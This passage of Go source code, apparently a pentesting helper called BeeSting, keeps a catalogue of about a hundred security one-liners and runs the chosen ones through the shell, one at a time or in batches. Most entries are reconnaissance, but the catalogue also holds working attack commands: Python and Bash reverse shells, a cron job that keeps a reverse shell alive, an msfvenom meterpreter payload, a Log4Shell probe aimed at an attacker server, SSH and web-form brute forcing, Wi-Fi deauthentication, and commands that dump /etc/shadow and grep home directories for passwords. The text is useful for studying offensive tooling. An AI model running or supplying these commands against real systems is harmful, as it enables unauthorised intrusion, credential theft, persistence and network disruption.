package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

type Command struct {
	Category    string
	Description string
	Command     string
}

func printBanner() {
	banner := `
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   ██████╗ ███████╗███████╗███████╗████████╗██╗███╗   ██╗ ██████╗ ║
║   ██╔══██╗██╔════╝██╔════╝██╔════╝╚══██╔══╝██║████╗  ██║██╔════╝ ║
║   ██████╔╝█████╗  █████╗  ███████╗   ██║   ██║██╔██╗ ██║██║  ███╗║
║   ██╔══██╗██╔══╝  ██╔══╝  ╚════██║   ██║   ██║██║╚██╗██║██║   ██║║
║   ██████╔╝███████╗███████╗███████║   ██║   ██║██║ ╚████║╚██████╔╝║
║   ╚═════╝ ╚══════╝╚══════╝╚══════╝   ╚═╝   ╚═╝╚═╝  ╚═══╝ ╚═════╝ ║
║                                                               ║
║        Top 100 Penetration Testing One-Liners                  ║
║        Vulnerability Scanning & CVE Testing                    ║
║                                                               ║
║              Created by BeeSting                               ║
║   https://www.linkedin.com/in/md-moin-khan-emon-a8467022b/      ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
`
	fmt.Println(banner)
}

func getCommands() []Command {
	return []Command{
		{
			Category:    "Network Scanning",
			Description: "Fast SYN scan on top 1000 ports",
			Command:     "nmap -sS -T4 -p- <target>",
		},
		{
			Category:    "Network Scanning",
			Description: "Aggressive scan with OS detection",
			Command:     "nmap -A -T4 <target>",
		},
		{
			Category:    "Network Scanning",
			Description: "Scan for live hosts in subnet",
			Command:     "nmap -sn 192.168.1.0/24",
		},
		{
			Category:    "Network Scanning",
			Description: "UDP scan on common ports",
			Command:     "nmap -sU -T4 -p 53,161,500 <target>",
		},
		{
			Category:    "Network Scanning",
			Description: "Scan with script for vulnerabilities",
			Command:     "nmap --script vuln <target>",
		},
		{
			Category:    "Vulnerability Scanning",
			Description: "Nikto web server scan",
			Command:     "nikto -h http://<target>",
		},
		{
			Category:    "Vulnerability Scanning",
			Description: "Nuclei CVE scanner",
			Command:     "nuclei -u <target> -t cves/",
		},
		{
			Category:    "Vulnerability Scanning",
			Description: "WPScan for WordPress vulnerabilities",
			Command:     "wpscan --url http://<target> --enumerate vp,vt,u",
		},
		{
			Category:    "Vulnerability Scanning",
			Description: "SSL/TLS vulnerability scan",
			Command:     "sslscan <target>:443",
		},
		{
			Category:    "Vulnerability Scanning",
			Description: "Testssl.sh comprehensive SSL test",
			Command:     "testssl.sh <target>:443",
		},
		{
			Category:    "Web Application",
			Description: "SQLMap injection test",
			Command:     "sqlmap -u 'http://<target>/page?id=1' --batch --dbs",
		},
		{
			Category:    "Web Application",
			Description: "Directory brute force with Gobuster",
			Command:     "gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt",
		},
		{
			Category:    "Web Application",
			Description: "Subdomain enumeration",
			Command:     "subfinder -d <domain> -silent | httpx -silent",
		},
		{
			Category:    "Web Application",
			Description: "XSS scanner with Dalfox",
			Command:     "dalfox url http://<target>/?param=value",
		},
		{
			Category:    "Web Application",
			Description: "FFUF fuzzer for parameters",
			Command:     "ffuf -u http://<target>/FUZZ -w /usr/share/wordlists/dirb/common.txt",
		},
		{
			Category:    "Web Application",
			Description: "Waybackurls for historical URLs",
			Command:     "echo <domain> | waybackurls | sort -u",
		},
		{
			Category:    "Web Application",
			Description: "JS file enumeration",
			Command:     "echo <domain> | gau | grep -iE '\\.js$' | sort -u",
		},
		{
			Category:    "Web Application",
			Description: "CORS misconfiguration check",
			Command:     "curl -H 'Origin: https://evil.com' -I http://<target>",
		},
		{
			Category:    "Exploitation",
			Description: "Metasploit search for exploits",
			Command:     "msfconsole -q -x 'search <cve>; exit'",
		},
		{
			Category:    "Exploitation",
			Description: "Reverse shell listener",
			Command:     "nc -lvnp 4444",
		},
		{
			Category:    "Exploitation",
			Description: "Python reverse shell",
			Command:     "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<ip>\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'",
		},
		{
			Category:    "Exploitation",
			Description: "Bash reverse shell",
			Command:     "bash -i >& /dev/tcp/<ip>/4444 0>&1",
		},
		{
			Category:    "Exploitation",
			Description: "MSFvenom payload generation",
			Command:     "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe > payload.exe",
		},
		{
			Category:    "Password Attacks",
			Description: "Hydra SSH brute force",
			Command:     "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<target>",
		},
		{
			Category:    "Password Attacks",
			Description: "Hydra web form brute force",
			Command:     "hydra -l admin -P passwords.txt <target> http-post-form '/login:username=^USER^&password=^PASS^:F=incorrect'",
		},
		{
			Category:    "Password Attacks",
			Description: "John the Ripper hash cracking",
			Command:     "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
		},
		{
			Category:    "Password Attacks",
			Description: "Hashcat MD5 cracking",
			Command:     "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt",
		},
		{
			Category:    "Password Attacks",
			Description: "Medusa RDP brute force",
			Command:     "medusa -h <target> -u admin -P passwords.txt -M rdp",
		},
		{
			Category:    "Privilege Escalation",
			Description: "LinPEAS Linux privilege escalation",
			Command:     "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
		},
		{
			Category:    "Privilege Escalation",
			Description: "Find SUID binaries",
			Command:     "find / -perm -u=s -type f 2>/dev/null",
		},
		{
			Category:    "Privilege Escalation",
			Description: "Check sudo privileges",
			Command:     "sudo -l",
		},
		{
			Category:    "Privilege Escalation",
			Description: "Search writable directories",
			Command:     "find / -writable -type d 2>/dev/null",
		},
		{
			Category:    "Wireless Testing",
			Description: "Monitor mode on wireless interface",
			Command:     "airmon-ng start wlan0",
		},
		{
			Category:    "Wireless Testing",
			Description: "Capture WPA handshake",
			Command:     "airodump-ng -c <channel> --bssid <bssid> -w capture wlan0mon",
		},
		{
			Category:    "Wireless Testing",
			Description: "Deauth attack",
			Command:     "aireplay-ng --deauth 10 -a <bssid> wlan0mon",
		},
		{
			Category:    "Enumeration",
			Description: "SMB enumeration",
			Command:     "enum4linux -a <target>",
		},
		{
			Category:    "Enumeration",
			Description: "SNMP enumeration",
			Command:     "snmp-check <target>",
		},
		{
			Category:    "Enumeration",
			Description: "DNS zone transfer",
			Command:     "dig axfr @<dns-server> <domain>",
		},
		{
			Category:    "Enumeration",
			Description: "NetBIOS enumeration",
			Command:     "nbtscan <target>/24",
		},
		{
			Category:    "Enumeration",
			Description: "LDAP enumeration",
			Command:     "ldapsearch -x -h <target> -b 'dc=domain,dc=com'",
		},
		{
			Category:    "CVE Testing",
			Description: "EternalBlue (MS17-010) check",
			Command:     "nmap --script smb-vuln-ms17-010 <target>",
		},
		{
			Category:    "CVE Testing",
			Description: "Heartbleed (CVE-2014-0160) test",
			Command:     "nmap --script ssl-heartbleed <target>",
		},
		{
			Category:    "CVE Testing",
			Description: "Shellshock (CVE-2014-6271) test",
			Command:     "curl -H 'User-Agent: () { :; }; echo vulnerable' http://<target>/cgi-bin/test.sh",
		},
		{
			Category:    "CVE Testing",
			Description: "Log4Shell (CVE-2021-44228) test",
			Command:     "curl 'http://<target>' -H 'X-Api-Version: ${jndi:ldap://<attacker-server>/a}'",
		},
		{
			Category:    "CVE Testing",
			Description: "ProxyLogon (CVE-2021-26855) check",
			Command:     "nmap --script http-vuln-cve2021-26855 <target>",
		},
		{
			Category:    "Post-Exploitation",
			Description: "Dump password hashes (Linux)",
			Command:     "cat /etc/shadow",
		},
		{
			Category:    "Post-Exploitation",
			Description: "Search for passwords in files",
			Command:     "grep -ri 'password' /home/* 2>/dev/null",
		},
		{
			Category:    "Post-Exploitation",
			Description: "Persistence via cron",
			Command:     "echo '*/5 * * * * /bin/bash -c \"bash -i >& /dev/tcp/<ip>/4444 0>&1\"' | crontab -",
		},
		{
			Category:    "Subdomain Enumeration",
			Description: "Find subdomains and check live with httpx",
			Command:     "subfinder -d <domain> -silent | httpx -silent -status-code -title -tech-detect -o live_subdomains.txt",
		},
		{
			Category:    "Subdomain Enumeration",
			Description: "Amass subdomain enumeration with httpx validation",
			Command:     "amass enum -passive -d <domain> | httpx -silent -mc 200,301,302,403 -o live_amass.txt",
		},
		{
			Category:    "Subdomain Enumeration",
			Description: "Assetfinder with httpx live check",
			Command:     "assetfinder --subs-only <domain> | httpx -silent -threads 200 -o live_assets.txt",
		},
		{
			Category:    "Subdomain Enumeration",
			Description: "Findomain subdomain discovery with httpx",
			Command:     "findomain -t <domain> -q | httpx -silent -follow-redirects -mc 200 -o live_findomain.txt",
		},
		{
			Category:    "Subdomain Enumeration",
			Description: "Certificate transparency subdomain enum",
			Command:     "curl -s 'https://crt.sh/?q=%.<domain>&output=json' | jq -r '.[].name_value' | sort -u | httpx -silent",
		},
		{
			Category:    "Subdomain Enumeration",
			Description: "GitHub subdomain scraping with httpx",
			Command:     "github-subdomains -d <domain> | httpx -silent -status-code -content-length",
		},
		{
			Category:    "Subdomain Enumeration",
			Description: "Chaos subdomain list with validation",
			Command:     "chaos -d <domain> -silent | httpx -silent -probe -nc -o chaos_live.txt",
		},
		{
			Category:    "Content Discovery",
			Description: "Gobuster directory brute force",
			Command:     "gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -t 50",
		},
		{
			Category:    "Content Discovery",
			Description: "Feroxbuster recursive discovery",
			Command:     "feroxbuster -u http://<target> -w /usr/share/wordlists/dirb/common.txt -x php,html,js,txt -t 200",
		},
		{
			Category:    "Content Discovery",
			Description: "FFUF with extension fuzzing",
			Command:     "ffuf -u http://<target>/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.js,.txt,.bak,.old -mc 200,301,302,403",
		},
		{
			Category:    "Content Discovery",
			Description: "Dirsearch automated content discovery",
			Command:     "dirsearch -u http://<target> -e php,html,js,txt,xml -t 100 --exclude-status 404",
		},
		{
			Category:    "Content Discovery",
			Description: "Hakrawler for endpoint discovery",
			Command:     "echo http://<target> | hakrawler -subs -u -insecure -t 20",
		},
		{
			Category:    "Content Discovery",
			Description: "Katana crawler for content discovery",
			Command:     "katana -u http://<target> -d 5 -jc -o katana_endpoints.txt",
		},
		{
			Category:    "Content Discovery",
			Description: "GAU for URL gathering and content discovery",
			Command:     "echo <domain> | gau | httpx -silent -mc 200,301,302,403 -o gau_live_urls.txt",
		},
		{
			Category:    "Advanced Recon",
			Description: "Full recon chain: subdomain -> live -> content",
			Command:     "subfinder -d <domain> -silent | httpx -silent -o live.txt && cat live.txt | nuclei -t exposures/",
		},
		{
			Category:    "Advanced Recon",
			Description: "Shodan subdomain + IP enumeration",
			Command:     "shodan domain <domain> | awk '{print $1}' | httpx -silent -probe",
		},
		{
			Category:    "Advanced Recon",
			Description: "DNS brute force with massdns",
			Command:     "massdns -r /usr/share/massdns/lists/resolvers.txt -t A -o S -w massdns_output.txt <domain>",
		},
		{
			Category:    "Advanced Recon",
			Description: "Port scanning with masscan",
			Command:     "masscan -p1-65535 <target> --rate=10000 -oL masscan.txt",
		},
		{
			Category:    "Advanced Recon",
			Description: "Technology detection on live hosts",
			Command:     "cat live_subdomains.txt | httpx -silent -tech-detect -status-code -title -ip -cname -json -o tech_stack.json",
		},
		{
			Category:    "Advanced Recon",
			Description: "Screenshot all live subdomains",
			Command:     "cat live_subdomains.txt | aquatone -out screenshots/",
		},
		{
			Category:    "Advanced Recon",
			Description: "Wayback URLs for archived content",
			Command:     "echo <domain> | waybackurls | httpx -silent -mc 200 -o wayback_live.txt",
		},
		{
			Category:    "API Discovery",
			Description: "API endpoint discovery with Arjun",
			Command:     "arjun -u http://<target> -oJ api_params.json",
		},
		{
			Category:    "API Discovery",
			Description: "Parameter mining from JavaScript files",
			Command:     "echo http://<target> | waybackurls | grep '\\.js$' | xargs -I {} curl -s {}",
		},
		{
			Category:    "API Discovery",
			Description: "GraphQL endpoint discovery",
			Command:     "echo http://<target> | httpx -path /graphql,/graphiql,/api/graphql -mc 200 -silent",
		},
		{
			Category:    "API Discovery",
			Description: "Swagger/OpenAPI detection",
			Command:     "ffuf -u http://<target>/FUZZ -w /usr/share/wordlists/api/swagger.txt -mc 200",
		},
		{
			Category:    "JavaScript Analysis",
			Description: "Extract endpoints from JS files",
			Command:     "echo http://<target> | gau | grep '\\.js$' | xargs -I {} curl -s {} | grep -Eo 'https?://[^\"]+' | sort -u",
		},
		{
			Category:    "JavaScript Analysis",
			Description: "Find secrets in JavaScript files",
			Command:     "echo http://<target> | waybackurls | grep '\\.js$' | xargs -I {} curl -s {} | grep -Eo '(api[_-]?key|secret|token|password)' | sort -u",
		},
		{
			Category:    "JavaScript Analysis",
			Description: "JSScanner for comprehensive JS analysis",
			Command:     "cat live_subdomains.txt | hakrawler -js | sort -u > js_endpoints.txt",
		},
		{
			Category:    "JavaScript Analysis",
			Description: "Subdomainizer for JS secrets",
			Command:     "python3 /opt/Subdomainizer/SubDomainizer.py -u http://<target> -o subdomainizer_output.txt",
		},
		{
			Category:    "Cloud Discovery",
			Description: "S3 bucket enumeration",
			Command:     "aws s3 ls s3://<domain> --no-sign-request",
		},
		{
			Category:    "Cloud Discovery",
			Description: "Cloud asset discovery with cloud_enum",
			Command:     "cloud_enum -k <domain>",
		},
		{
			Category:    "Cloud Discovery",
			Description: "GitHub dorking for exposed secrets",
			Command:     "python3 /opt/github-search/github-search.py -d <domain> -s api_key,secret,token",
		},
		{
			Category:    "Cloud Discovery",
			Description: "GitLab repository enumeration",
			Command:     "curl -s 'https://gitlab.com/api/v4/projects?search=<domain>&per_page=100' | jq -r '.[].http_url_to_repo'",
		},
		{
			Category:    "Vuln Scanning Advanced",
			Description: "Nuclei full template scan on live hosts",
			Command:     "cat live_subdomains.txt | nuclei -t ~/nuclei-templates/ -severity critical,high,medium -o nuclei_results.txt",
		},
		{
			Category:    "Vuln Scanning Advanced",
			Description: "XSS hunting with XSStrike",
			Command:     "python3 /opt/XSStrike/xsstrike.py -u 'http://<target>/?param=test'",
		},
		{
			Category:    "Vuln Scanning Advanced",
			Description: "SSRF testing with Interactsh",
			Command:     "echo http://<target> | nuclei -t ssrf/ -interactsh",
		},
		{
			Category:    "Vuln Scanning Advanced",
			Description: "SQL injection with SQLMap aggressive",
			Command:     "sqlmap -u 'http://<target>/?id=1' --batch --level=5 --risk=3 --random-agent --dbs",
		},
		{
			Category:    "Vuln Scanning Advanced",
			Description: "CORS misconfiguration scanner",
			Command:     "cat live_subdomains.txt | while read url; do curl -s -I -H 'Origin: https://evil.com' $url | grep -i 'access-control'; done",
		},
		{
			Category:    "Vuln Scanning Advanced",
			Description: "Clickjacking vulnerability check",
			Command:     "cat live_subdomains.txt | httpx -silent -header 'X-Frame-Options' -status-code",
		},
		{
			Category:    "Vuln Scanning Advanced",
			Description: "Open redirect vulnerability scanner",
			Command:     "cat live_subdomains.txt | gau | grep '=http' | httpx -silent -mc 301,302 -location",
		},
		{
			Category:    "Vuln Scanning Advanced",
			Description: "Prototype pollution scanner",
			Command:     "echo http://<target> | nuclei -t ~/nuclei-templates/http/vulnerabilities/generic/",
		},
		{
			Category:    "Mobile & API Testing",
			Description: "Android APK security analysis",
			Command:     "apktool d app.apk -o app_decompiled && grep -r 'api_key' app_decompiled/",
		},
		{
			Category:    "Mobile & API Testing",
			Description: "REST API fuzzing with wfuzz",
			Command:     "wfuzz -c -z file,/usr/share/wordlists/api/api-endpoints.txt http://<target>/api/FUZZ",
		},
		{
			Category:    "Mobile & API Testing",
			Description: "JWT token security analysis",
			Command:     "python3 /opt/jwt_tool/jwt_tool.py <token>",
		},
		{
			Category:    "Mobile & API Testing",
			Description: "API rate limit testing",
			Command:     "for i in {1..100}; do curl -s -o /dev/null -w '%{http_code}\\n' http://<target>/api/endpoint; done",
		},
		{
			Category:    "Container Security",
			Description: "Docker container enumeration",
			Command:     "docker ps -a && docker images",
		},
		{
			Category:    "Container Security",
			Description: "Kubernetes security audit",
			Command:     "kubectl get pods --all-namespaces",
		},
		{
			Category:    "Container Security",
			Description: "Container vulnerability scanning with Trivy",
			Command:     "trivy image <target> --severity HIGH,CRITICAL",
		},
	}
}

func displayMenu() {
	fmt.Println("\n[+] Choose an option:")
	fmt.Println("    1. Show all commands")
	fmt.Println("    2. Filter by category")
	fmt.Println("    3. Search by keyword")
	fmt.Println("    4. Run a command")
	fmt.Println("    5. Batch execution mode")
	fmt.Println("    6. Custom command manager")
	fmt.Println("    7. Exit")
	fmt.Print("\n[>] Your choice: ")
}

func showAllCommands(commands []Command) {
	fmt.Println("\n" + strings.Repeat("=", 80))
	currentCategory := ""
	for i, cmd := range commands {
		if cmd.Category != currentCategory {
			currentCategory = cmd.Category
			fmt.Printf("\n🔸 %s\n", currentCategory)
			fmt.Println(strings.Repeat("-", 80))
		}
		fmt.Printf("\n[%d] %s\n", i+1, cmd.Description)
		fmt.Printf("    💻 %s\n", cmd.Command)
	}
	fmt.Println("\n" + strings.Repeat("=", 80))
}

func filterByCategory(commands []Command) {
	categories := make(map[string]bool)
	for _, cmd := range commands {
		categories[cmd.Category] = true
	}
	
	fmt.Println("\n[+] Available Categories:")
	i := 1
	catList := make([]string, 0, len(categories))
	for cat := range categories {
		fmt.Printf("    %d. %s\n", i, cat)
		catList = append(catList, cat)
		i++
	}
	
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("\n[>] Select category number: ")
	choiceStr, _ := reader.ReadString('\n')
	choiceStr = strings.TrimSpace(choiceStr)
	choice, err := strconv.Atoi(choiceStr)
	
	if err != nil || choice < 1 || choice > len(catList) {
		fmt.Println("\n[!] Invalid choice")
		return
	}
	
	selectedCat := catList[choice-1]
	fmt.Printf("\n🔸 Category: %s\n", selectedCat)
	fmt.Println(strings.Repeat("-", 80))
	
	count := 1
	for _, cmd := range commands {
		if cmd.Category == selectedCat {
			fmt.Printf("\n[%d] %s\n", count, cmd.Description)
			fmt.Printf("    💻 %s\n", cmd.Command)
			count++
		}
	}
	fmt.Println("\n" + strings.Repeat("=", 80))
}

func searchByKeyword(commands []Command) {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("\n[>] Enter search keyword: ")
	keyword, _ := reader.ReadString('\n')
	keyword = strings.TrimSpace(keyword)
	
	keyword = strings.ToLower(keyword)
	fmt.Printf("\n🔍 Search results for: %s\n", keyword)
	fmt.Println(strings.Repeat("-", 80))
	
	found := false
	count := 1
	for _, cmd := range commands {
		if strings.Contains(strings.ToLower(cmd.Description), keyword) ||
			strings.Contains(strings.ToLower(cmd.Command), keyword) ||
			strings.Contains(strings.ToLower(cmd.Category), keyword) {
			fmt.Printf("\n[%d] %s (%s)\n", count, cmd.Description, cmd.Category)
			fmt.Printf("    💻 %s\n", cmd.Command)
			found = true
			count++
		}
	}
	
	if !found {
		fmt.Println("\n[!] No commands found matching your search")
	}
	fmt.Println("\n" + strings.Repeat("=", 80))
}

func executeCommand(cmdStr string) error {
	fmt.Printf("\n[+] Executing: %s\n", cmdStr)
	fmt.Println(strings.Repeat("-", 80))
	
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", cmdStr)
	} else {
		cmd = exec.Command("bash", "-c", cmdStr)
	}
	
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Stdin = os.Stdin
	
	startTime := time.Now()
	err := cmd.Run()
	duration := time.Since(startTime)
	
	fmt.Println(strings.Repeat("-", 80))
	if err != nil {
		fmt.Printf("[!] Command failed: %v\n", err)
		fmt.Printf("[+] Execution time: %v\n", duration)
		return err
	}
	
	fmt.Printf("[✓] Command completed successfully\n")
	fmt.Printf("[+] Execution time: %v\n", duration)
	return nil
}

func replaceVariables(cmdStr string) string {
	reader := bufio.NewReader(os.Stdin)
	
	if strings.Contains(cmdStr, "<target>") {
		fmt.Print("[>] Enter target IP/hostname: ")
		target, _ := reader.ReadString('\n')
		target = strings.TrimSpace(target)
		cmdStr = strings.ReplaceAll(cmdStr, "<target>", target)
	}
	
	if strings.Contains(cmdStr, "<domain>") {
		fmt.Print("[>] Enter domain: ")
		domain, _ := reader.ReadString('\n')
		domain = strings.TrimSpace(domain)
		cmdStr = strings.ReplaceAll(cmdStr, "<domain>", domain)
	}
	
	if strings.Contains(cmdStr, "<ip>") {
		fmt.Print("[>] Enter IP address: ")
		ip, _ := reader.ReadString('\n')
		ip = strings.TrimSpace(ip)
		cmdStr = strings.ReplaceAll(cmdStr, "<ip>", ip)
	}
	
	if strings.Contains(cmdStr, "<bssid>") {
		fmt.Print("[>] Enter BSSID: ")
		bssid, _ := reader.ReadString('\n')
		bssid = strings.TrimSpace(bssid)
		cmdStr = strings.ReplaceAll(cmdStr, "<bssid>", bssid)
	}
	
	if strings.Contains(cmdStr, "<channel>") {
		fmt.Print("[>] Enter channel: ")
		channel, _ := reader.ReadString('\n')
		channel = strings.TrimSpace(channel)
		cmdStr = strings.ReplaceAll(cmdStr, "<channel>", channel)
	}
	
	if strings.Contains(cmdStr, "<dns-server>") {
		fmt.Print("[>] Enter DNS server: ")
		dns, _ := reader.ReadString('\n')
		dns = strings.TrimSpace(dns)
		cmdStr = strings.ReplaceAll(cmdStr, "<dns-server>", dns)
	}
	
	if strings.Contains(cmdStr, "<cve>") {
		fmt.Print("[>] Enter CVE or service name: ")
		cve, _ := reader.ReadString('\n')
		cve = strings.TrimSpace(cve)
		cmdStr = strings.ReplaceAll(cmdStr, "<cve>", cve)
	}
	
	if strings.Contains(cmdStr, "<attacker-server>") {
		fmt.Print("[>] Enter attacker server: ")
		server, _ := reader.ReadString('\n')
		server = strings.TrimSpace(server)
		cmdStr = strings.ReplaceAll(cmdStr, "<attacker-server>", server)
	}
	
	if strings.Contains(cmdStr, "<token>") {
		fmt.Print("[>] Enter token: ")
		token, _ := reader.ReadString('\n')
		token = strings.TrimSpace(token)
		cmdStr = strings.ReplaceAll(cmdStr, "<token>", token)
	}
	
	return cmdStr
}

func runCommand(commands []Command) {
	reader := bufio.NewReader(os.Stdin)
	
	fmt.Println("\n[+] Available commands:")
	for i, cmd := range commands {
		fmt.Printf("    [%d] %s - %s\n", i+1, cmd.Category, cmd.Description)
	}
	
	fmt.Print("\n[>] Enter command number to execute: ")
	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)
	
	num, err := strconv.Atoi(choice)
	if err != nil || num < 1 || num > len(commands) {
		fmt.Println("[!] Invalid command number")
		return
	}
	
	selectedCmd := commands[num-1]
	fmt.Printf("\n[+] Selected: %s\n", selectedCmd.Description)
	fmt.Printf("[+] Command: %s\n", selectedCmd.Command)
	
	cmdStr := replaceVariables(selectedCmd.Command)
	
	fmt.Printf("\n[+] Final command: %s\n", cmdStr)
	fmt.Print("\n[?] Execute this command? (y/n): ")
	confirm, _ := reader.ReadString('\n')
	confirm = strings.ToLower(strings.TrimSpace(confirm))
	
	if confirm == "y" || confirm == "yes" {
		executeCommand(cmdStr)
	} else {
		fmt.Println("[!] Command execution cancelled")
	}
}

func batchExecution(commands []Command) {
	reader := bufio.NewReader(os.Stdin)
	
	fmt.Println("\n[+] Batch Execution Mode")
	fmt.Println("[+] Enter command numbers separated by commas (e.g., 1,3,5)")
	fmt.Print("\n[>] Command numbers: ")
	
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)
	
	numbers := strings.Split(input, ",")
	var selectedCommands []Command
	
	for _, numStr := range numbers {
		numStr = strings.TrimSpace(numStr)
		num, err := strconv.Atoi(numStr)
		if err != nil || num < 1 || num > len(commands) {
			fmt.Printf("[!] Invalid command number: %s\n", numStr)
			continue
		}
		selectedCommands = append(selectedCommands, commands[num-1])
	}
	
	if len(selectedCommands) == 0 {
		fmt.Println("[!] No valid commands selected")
		return
	}
	
	fmt.Printf("\n[+] Selected %d commands for execution:\n", len(selectedCommands))
	for i, cmd := range selectedCommands {
		fmt.Printf("    %d. %s\n", i+1, cmd.Description)
	}
	
	fmt.Print("\n[?] Continue with batch execution? (y/n): ")
	confirm, _ := reader.ReadString('\n')
	confirm = strings.ToLower(strings.TrimSpace(confirm))
	
	if confirm != "y" && confirm != "yes" {
		fmt.Println("[!] Batch execution cancelled")
		return
	}
	
	successCount := 0
	failCount := 0
	
	for i, cmd := range selectedCommands {
		fmt.Printf("\n\n")
		fmt.Println(strings.Repeat("=", 64))
		fmt.Printf("║ Executing command %d of %d\n", i+1, len(selectedCommands))
		fmt.Println(strings.Repeat("=", 64))
		
		cmdStr := replaceVariables(cmd.Command)
		err := executeCommand(cmdStr)
		
		if err != nil {
			failCount++
			fmt.Print("\n[?] Continue to next command? (y/n): ")
			cont, _ := reader.ReadString('\n')
			cont = strings.ToLower(strings.TrimSpace(cont))
			if cont != "y" && cont != "yes" {
				break
			}
		} else {
			successCount++
		}
		
		if i < len(selectedCommands)-1 {
			fmt.Println("\n[+] Waiting 2 seconds before next command...")
			time.Sleep(2 * time.Second)
		}
	}
	
	fmt.Printf("\n\n[+] Batch Execution Summary:\n")
	fmt.Printf("    ✓ Successful: %d\n", successCount)
	fmt.Printf("    ✗ Failed: %d\n", failCount)
	fmt.Printf("    Total: %d\n", len(selectedCommands))
}

func getCustomCommandsFile() string {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return ".beesting_custom_commands.json"
	}
	return filepath.Join(homeDir, ".beesting_custom_commands.json")
}

func loadCustomCommands() []Command {
	filePath := getCustomCommandsFile()
	data, err := ioutil.ReadFile(filePath)
	if err != nil {
		return []Command{}
	}
	
	var customCommands []Command
	err = json.Unmarshal(data, &customCommands)
	if err != nil {
		fmt.Printf("[!] Error loading custom commands: %v\n", err)
		return []Command{}
	}
	
	return customCommands
}

func saveCustomCommands(customCommands []Command) error {
	filePath := getCustomCommandsFile()
	data, err := json.MarshalIndent(customCommands, "", "  ")
	if err != nil {
		return err
	}
	
	return ioutil.WriteFile(filePath, data, 0644)
}

func addCustomCommand() Command {
	reader := bufio.NewReader(os.Stdin)
	
	fmt.Println("\n[+] Add New Custom Command")
	fmt.Println(strings.Repeat("-", 80))
	
	fmt.Print("\n[>] Enter category: ")
	category, _ := reader.ReadString('\n')
	category = strings.TrimSpace(category)
	
	fmt.Print("[>] Enter description: ")
	description, _ := reader.ReadString('\n')
	description = strings.TrimSpace(description)
	
	fmt.Print("[>] Enter command: ")
	command, _ := reader.ReadString('\n')
	command = strings.TrimSpace(command)
	
	fmt.Println("\n[+] Custom command created:")
	fmt.Printf("    Category: %s\n", category)
	fmt.Printf("    Description: %s\n", description)
	fmt.Printf("    Command: %s\n", command)
	
	return Command{
		Category:    category,
		Description: description,
		Command:     command,
	}
}

func editCustomCommand(cmd Command) Command {
	reader := bufio.NewReader(os.Stdin)
	
	fmt.Println("\n[+] Edit Custom Command")
	fmt.Println(strings.Repeat("-", 80))
	
	fmt.Printf("\n[>] Enter new category (current: %s) [press Enter to keep]: ", cmd.Category)
	category, _ := reader.ReadString('\n')
	category = strings.TrimSpace(category)
	if category == "" {
		category = cmd.Category
	}
	
	fmt.Printf("[>] Enter new description (current: %s) [press Enter to keep]: ", cmd.Description)
	description, _ := reader.ReadString('\n')
	description = strings.TrimSpace(description)
	if description == "" {
		description = cmd.Description
	}
	
	fmt.Printf("[>] Enter new command (current: %s) [press Enter to keep]: ", cmd.Command)
	command, _ := reader.ReadString('\n')
	command = strings.TrimSpace(command)
	if command == "" {
		command = cmd.Command
	}
	
	fmt.Println("\n[+] Custom command updated:")
	fmt.Printf("    Category: %s\n", category)
	fmt.Printf("    Description: %s\n", description)
	fmt.Printf("    Command: %s\n", command)
	
	return Command{
		Category:    category,
		Description: description,
		Command:     command,
	}
}

func customCommandManager(customCommands *[]Command) {
	reader := bufio.NewReader(os.Stdin)
	
	for {
		fmt.Println("\n" + strings.Repeat("=", 80))
		fmt.Println("🔧 CUSTOM COMMAND MANAGER")
		fmt.Println(strings.Repeat("=", 80))
		fmt.Println("\n[+] Options:")
		fmt.Println("    1. View custom commands")
		fmt.Println("    2. Add custom command")
		fmt.Println("    3. Edit custom command")
		fmt.Println("    4. Delete custom command")
		fmt.Println("    5. Export custom commands")
		fmt.Println("    6. Import custom commands")
		fmt.Println("    7. Back to main menu")
		fmt.Print("\n[>] Your choice: ")
		
		choice, _ := reader.ReadString('\n')
		choice = strings.TrimSpace(choice)
		
		switch choice {
		case "1":
			// View custom commands
			if len(*customCommands) == 0 {
				fmt.Println("\n[!] No custom commands found")
			} else {
				fmt.Printf("\n[+] Total custom commands: %d\n", len(*customCommands))
				fmt.Println(strings.Repeat("-", 80))
				for i, cmd := range *customCommands {
					fmt.Printf("\n[%d] Category: %s\n", i+1, cmd.Category)
					fmt.Printf("    Description: %s\n", cmd.Description)
					fmt.Printf("    Command: %s\n", cmd.Command)
				}
			}
			
		case "2":
			// Add custom command
			newCmd := addCustomCommand()
			*customCommands = append(*customCommands, newCmd)
			err := saveCustomCommands(*customCommands)
			if err != nil {
				fmt.Printf("[!] Error saving: %v\n", err)
			} else {
				fmt.Println("\n[✓] Custom command added successfully!")
			}
			
		case "3":
			// Edit custom command
			if len(*customCommands) == 0 {
				fmt.Println("\n[!] No custom commands to edit")
				break
			}
			
			fmt.Println("\n[+] Custom commands:")
			for i, cmd := range *customCommands {
				fmt.Printf("    [%d] %s - %s\n", i+1, cmd.Category, cmd.Description)
			}
			
			fmt.Print("\n[>] Enter command number to edit: ")
			numStr, _ := reader.ReadString('\n')
			numStr = strings.TrimSpace(numStr)
			num, err := strconv.Atoi(numStr)
			
			if err != nil || num < 1 || num > len(*customCommands) {
				fmt.Println("[!] Invalid command number")
				break
			}
